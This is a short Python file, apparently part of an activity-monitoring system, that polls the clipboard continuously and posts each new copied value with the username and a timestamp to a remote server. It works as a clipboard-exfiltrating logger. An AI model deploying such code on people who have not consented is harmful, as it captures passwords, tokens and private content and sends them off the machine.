import pyperclip
from time import sleep
from datetime import datetime
from getpass import getuser  # user id
from requests import post
from utils import consumerServer


# constantly monitors clipboard for changes
def logClipboard():
    recent_value = ""
    while 1:
        temp_value = pyperclip.paste()
        if temp_value != recent_value:
            recent_value = temp_value
            print(f"{datetime.now()} {getuser()} OS-Clipboard copy {recent_value}")
            post(consumerServer.SERVER_ADDR, json={
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S%MS"),
                "user": getuser(),
                "category": "OS-Clipboard",
                "application": "Clipboard",
                "event_type": "copy",
                "clipboard_content": recent_value
            })
        sleep(0.2)

